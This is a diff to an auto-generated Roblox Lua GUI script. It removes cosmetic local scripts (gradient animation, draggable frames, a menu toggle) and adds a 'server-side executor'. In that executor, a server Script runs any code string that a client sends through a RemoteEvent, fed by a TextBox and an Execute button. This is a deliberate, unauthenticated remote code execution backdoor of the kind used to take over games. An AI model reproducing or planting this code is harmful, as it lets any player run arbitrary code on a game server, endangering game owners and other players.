@@ -147,198 +147,29 @@ FNONAuNzUHzAquC.UICorner_5.Parent = FNONAuNzUHzAquC.ImageButton_1
 
 FNONAuNzUHzAquC.UICorner_6.Parent = FNONAuNzUHzAquC.ImageButton_1
 
-----------------------------------------------------------------------------------------------------
-
-local function LocalScript_1(script)
-
-	--[[
-	
-	
-	
-	            __   ___     __             ___  __   __       
-	 |\/|  /\  |  \ |__     |__) \ /    \_/  |  /  \ |__)  /\  
-	 |  | /~~\ |__/ |___    |__)  |     / \  |  \__/ |    /~~\ 
-	                                                           
-	
-	
-			~ 2023.03.31
-		- Moving UIGradient
-	
-	]]--
-	
-	-- Variables 
-	
-	local TweenService = game:GetService("TweenService")
-	local gradient = script.Parent
-	
-	-- Main Func.
-	
-	while true do
-		local tween = TweenService:Create(gradient, TweenInfo.new(1), {
-			Offset = Vector2.new(0.3 * math.sin(time()), 0)
-		})
-		tween:Play()	-- start the tween animation
-		wait()	-- A wait for when the gradient reaches the end point, if it was wait(1) it would wait 1 second before looping over again
-		
-	--REMOVING "WAIT" WILL BREAK THE ENTIRE SCRIPT AND LAG YOUR GAME
-		
-	end -- end [Can you believe that!]
-	
-end
 
 ----------------------------------------------------------------------------------------------------
-
-local function LocalScript_5(script)
-
-	--[[
-	
-	
-	
-	            __   ___     __             ___  __   __       
-	 |\/|  /\  |  \ |__     |__) \ /    \_/  |  /  \ |__)  /\  
-	 |  | /~~\ |__/ |___    |__)  |     / \  |  \__/ |    /~~\ 
-	                                                           
-	
-	
-			~ 2023.03.31
-		- Moving UIGradient
-	
-	]]--
-	
-	-- Variables 
-	
-	local TweenService = game:GetService("TweenService")
-	local gradient = script.Parent
-	
-	-- Main Func.
-	
-	while true do
-		local tween = TweenService:Create(gradient, TweenInfo.new(1), {
-			Offset = Vector2.new(0.3 * math.sin(time()), 0)
-		})
-		tween:Play()	-- start the tween animation
-		wait()	-- A wait for when the gradient reaches the end point, if it was wait(1) it would wait 1 second before looping over again
-		
-	--REMOVING "WAIT" WILL BREAK THE ENTIRE SCRIPT AND LAG YOUR GAME
-		
-	end -- end [Can you believe that!]
-	
-end
-
-----------------------------------------------------------------------------------------------------
-
-local function LocalScript_6(script)
-
-	-- MainFrame Drag
-	
-	script.Parent.Active = true
-	script.Parent.Draggable = true
-	
-	-- Execute Local Script
-	
-	
-	-- Clear Local Script
-	
-	
-	
-end
-
-----------------------------------------------------------------------------------------------------
-
-local function LocalScript_7(script)
-
-	-- MainFrame Drag
-	
-	script.Parent.Active = true
-	script.Parent.Draggable = true
-	
-	-- Execute Local Script
-	
-	
-	-- Clear Local Script
-	
-	
-	
-end
-
-----------------------------------------------------------------------------------------------------
-
-local function LocalScript_4(script)
-
-	--[[
-	
-	
-	
-	            __   ___     __             ___  __   __       
-	 |\/|  /\  |  \ |__     |__) \ /    \_/  |  /  \ |__)  /\  
-	 |  | /~~\ |__/ |___    |__)  |     / \  |  \__/ |    /~~\ 
-	                                                           
-	
-	
-			~ 2023.03.31
-		- Moving UIGradient
-	
-	]]--
-	
-	-- Variables 
-	
-	local TweenService = game:GetService("TweenService")
-	local gradient = script.Parent
-	
-	-- Main Func.
-	
-	while true do
-		local tween = TweenService:Create(gradient, TweenInfo.new(1), {
-			Offset = Vector2.new(0.3 * math.sin(time()), 0)
-		})
-		tween:Play()	-- start the tween animation
-		wait()	-- A wait for when the gradient reaches the end point, if it was wait(1) it would wait 1 second before looping over again
-		
-	--REMOVING "WAIT" WILL BREAK THE ENTIRE SCRIPT AND LAG YOUR GAME
-		
-	end -- end [Can you believe that!]
-	
-end
-
-----------------------------------------------------------------------------------------------------
-
-local function LocalScript_2(script)
-
-	script.Parent.MouseButton1Click:Connect(function()
-		loadstring(script.Parent.Parent.Source.Text)()
+function SCRIPT_MGRK65_FAKESCRIPT() -- FNONAuNzUHzAquC.TextButton_1.Script 
+	local script = Instance.new('Script')
+	script.Parent = FNONAuNzUHzAquC.TextButton_1
+	local remote = script.Parent.MSFunction
+ 
+	remote.OnServerEvent:Connect(function(idk, lol)
+		require(script.Loadstring)(lol)()
 	end)
-	
+ 
 end
-
-----------------------------------------------------------------------------------------------------
-
-local function LocalScript_3(script)
-
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Source.Text = ''
+coroutine.resume(coroutine.create(SCRIPT_MGRK65_FAKESCRIPT))
+function SCRIPT_SCMF76_FAKESCRIPT() -- FNONAuNzUHzAquC.TextButton_1.LocalScript 
+	local script = Instance.new('LocalScript')
+	script.Parent = FNONAuNzUHzAquC.TextButton_1
+	local execute = script.Parent.Parent.Execute
+	local text = script.Parent.Parent.TextBox
+	local remote = script.Parent.MSFunction
+ 
+	execute.MouseButton1Click:Connect(function()
+		remote:FireServer(text.Text)
 	end)
-	
+ 
 end
-
-----------------------------------------------------------------------------------------------------
-
-local function LocalScript_8(script)
-
-	--You dont need to delete this text.
-	--PUT INSIDE a BUTTON in StarterGui
-	--Make sure to make a frame for the menu to pop up then go to properties > Visible [Off]
-	script.Parent.MouseButton1Click:Connect (function()
-		script.Parent.Parent.Main.Visible = not script.Parent.Parent.Main.Visible
-	end)
-end
-
-----------------------------------------------------------------------------------------------------
-
-coroutine.wrap(LocalScript_1)(FNONAuNzUHzAquC.LocalScript_1)
-coroutine.wrap(LocalScript_5)(FNONAuNzUHzAquC.LocalScript_5)
-coroutine.wrap(LocalScript_6)(FNONAuNzUHzAquC.LocalScript_6)
-coroutine.wrap(LocalScript_7)(FNONAuNzUHzAquC.LocalScript_7)
-coroutine.wrap(LocalScript_4)(FNONAuNzUHzAquC.LocalScript_4)
-coroutine.wrap(LocalScript_2)(FNONAuNzUHzAquC.LocalScript_2)
-coroutine.wrap(LocalScript_3)(FNONAuNzUHzAquC.LocalScript_3)
-coroutine.wrap(LocalScript_8)(FNONAuNzUHzAquC.LocalScript_8)
+coroutine.resume(coroutine.create(SCRIPT_SCMF76_FAKESCRIPT))
